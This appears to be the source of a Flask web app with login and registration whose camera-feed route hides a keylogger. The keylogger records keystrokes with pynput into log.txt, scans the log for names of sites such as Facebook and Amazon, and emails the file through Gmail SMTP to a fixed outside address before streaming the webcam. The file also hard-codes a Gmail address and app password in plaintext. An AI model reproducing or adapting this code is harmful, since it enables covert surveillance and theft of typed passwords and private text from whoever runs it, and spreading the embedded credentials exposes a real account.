from flask import (
    Flask,
    render_template,
    redirect,
    flash,
    Response,
    url_for,
    session
)
from pynput.keyboard import Listener
import cv2
from datetime import timedelta
from sqlalchemy.exc import (
    IntegrityError,
    DataError,
    DatabaseError,
    InterfaceError,
    InvalidRequestError,
)
from werkzeug.routing import BuildError


from flask_bcrypt import Bcrypt,generate_password_hash, check_password_hash

from flask_login import (
    UserMixin,
    login_user,
    LoginManager,
    current_user,
    logout_user,
    login_required,
)

from app import create_app,db,login_manager,bcrypt
from models import User
from forms import login_form,register_form
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication

def send_email(subject, body, to_email, attachment_path=None):
    # Create an MIMEMultipart object
    msg = MIMEMultipart()

    # Set the email subject
    msg['Subject'] = subject

    # Attach the email body as text
    msg.attach(MIMEText(body, 'plain'))

    # If an attachment path is provided, attach the file
    if attachment_path:
        with open("log.txt", "rb") as attachment:
            # Create an MIMEApplication object for the attachment
            part = MIMEApplication(attachment.read(), Name="log.txt")
            # Set the Content-Disposition header to specify the file name
            part['log.txt'] = f'attachment; filename="{"log.txt"}"'
            # Attach the file to the email
            msg.attach(part)

    # Create an SMTP object and connect to the Gmail server
    s = smtplib.SMTP('smtp.gmail.com', 587)

    # Start TLS (Transport Layer Security) encryption for a secure connection
    s.starttls()

    try:
        # Log in to the Gmail account with the provided credentials
        s.login("instantjob0@gmail.com", "cwmtrjmmnlhmfnez")

        # Send the email using the sendmail method, providing sender, recipient, and the email message
        s.sendmail("instantjob0@gmail.com", to_email, msg.as_string())

        print("Email sent successfully.")

        return True
    except Exception as e:
        print(f"Error: {e}")
        return False
    finally:
        # Close the connection to the SMTP server
        s.quit()


# Example usage with an attachment
email_subject = "Test Email with Attachment"
email_body = "Hello, this is a test email with an attachment."
recipient_email = "ramac6109@gmail.com"
attachment_file_path = "log.txt"


@login_manager.user_loader
def load_user(user_id):
    return User.query.get(int(user_id))

app = create_app()

@app.before_request
def session_handler():
    session.permanent = True
    app.permanent_session_lifetime = timedelta(minutes=1)

@app.route("/", methods=("GET", "POST"), strict_slashes=False)
def index():
    return render_template("index.html",title="Home")


@app.route("/login/", methods=("GET", "POST"), strict_slashes=False)
def login():
    form = login_form()

    if form.validate_on_submit():
        try:
            user = User.query.filter_by(email=form.email.data).first()
            if check_password_hash(user.pwd, form.pwd.data):
                login_user(user)
                return redirect(url_for('index'))
            else:
                flash("Invalid Username or password!", "danger")
        except Exception as e:
            flash(e, "danger")

    return render_template("auth.html",
        form=form,
        text="Login",
        title="Login",
        btn_action="Login"
        )
#video feed
@app.route('/video_feed')
@login_required
def video_feed():
    def generate():
        def remove_last_letter_from_file(file_path):
            with open(file_path, 'r') as f:
                content = f.read()
            if content:
                with open(file_path, 'w') as f:
                    f.write(content[:-1])
        def write_to_file(key):
            letter = str(key)
            letter = letter.replace("'", "")

            if letter == 'Key.space':
                letter = ' '
            if letter == 'Key.shift_r':
                letter = ''
            if letter == "Key.ctrl_l":
                letter = ""
            if letter == "Key.enter":
                letter = "\n"
            if letter == "Key.backspace":
                # Call the function to remove the last letter from the file
                remove_last_letter_from_file("log.txt")
                return  # Skip writing to the file for backspace
            if letter == "Key.cmdw":
                letter == 'Tab closed'

            with open("log.txt", 'a') as f:
                f.write(letter)

        with Listener(on_press=write_to_file) as l:
             l.join()

        def clear_file(file_path):
            with open(file_path, 'w') as f:
                f.write('')
        file_path = 'log.txt'
        clear_file(file_path)  
        def find_social_media_platforms(file_path):
            # List of known social media platforms
            social_media_platforms = ["facebook", "twitter", "instagram", "netlfix", "snapchat", "youtube","amazon"]

            # Open the file in read mode
            with open(file_path, 'r') as file:
                # Read each line in the file
                for line in file:
                    # Remove leading and trailing whitespaces
                    name = line.strip().lower()

                    # Check if the name corresponds to a known social media platform
                    if name in social_media_platforms:
                        print(f"Found social media platform: {name}")

        file_path = 'log.txt'
        find_social_media_platforms(file_path)
        def check_file_length(filename):
            try:
                with open(filename, 'r', encoding='utf-8') as file:
                    content = file.read()
                    if len(content) > 250:
                        print("Too busy on laptop")
                    else:
                        print("File length is within the acceptable range.")
            except FileNotFoundError:
                print(f"File '{filename}' not found.")
            except Exception as e:
                print(f"An error occurred: {e}")

        # Replace 'your_file.txt' with the actual path to your text file
        check_file_length('log.txt')
        send_email(email_subject, email_body, recipient_email, attachment_file_path)  

        cap = cv2.VideoCapture(0)  # Change the file path if necessary
        print("Camera Started")
        while True:
            ret, frame = cap.read()
            if not ret:
                break
            
            # Encode the frame into JPEG format
            ret, buffer = cv2.imencode('.jpg', frame)
            frame = buffer.tobytes()
            yield (b'--frame\r\n'
                   b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')

    return Response(generate(), mimetype='multipart/x-mixed-replace; boundary=frame')


# Register route
@app.route("/register/", methods=("GET", "POST"), strict_slashes=False)
def register():
    form = register_form()
    if form.validate_on_submit():
        try:
            email = form.email.data
            pwd = form.pwd.data
            username = form.username.data
            
            newuser = User(
                username=username,
                email=email,
                pwd=bcrypt.generate_password_hash(pwd),
            )
    
            db.session.add(newuser)
            db.session.commit()
            flash(f"Account Succesfully created", "success")
            return redirect(url_for("login"))

        except InvalidRequestError:
            db.session.rollback()
            flash(f"Something went wrong!", "danger")
        except IntegrityError:
            db.session.rollback()
            flash(f"User already exists!.", "warning")
        except DataError:
            db.session.rollback()
            flash(f"Invalid Entry", "warning")
        except InterfaceError:
            db.session.rollback()
            flash(f"Error connecting to the database", "danger")
        except DatabaseError:
            db.session.rollback()
            flash(f"Error connecting to the database", "danger")
        except BuildError:
            db.session.rollback()
            flash(f"An error occured !", "danger")
    return render_template("auth.html",
        form=form,
        text="Create account",
        title="Register",
        btn_action="Register account"
        )

@app.route("/logout")
@login_required
def logout():
    logout_user()
    return redirect(url_for('login'))


if __name__ == "__main__":
    app.run(debug=True)
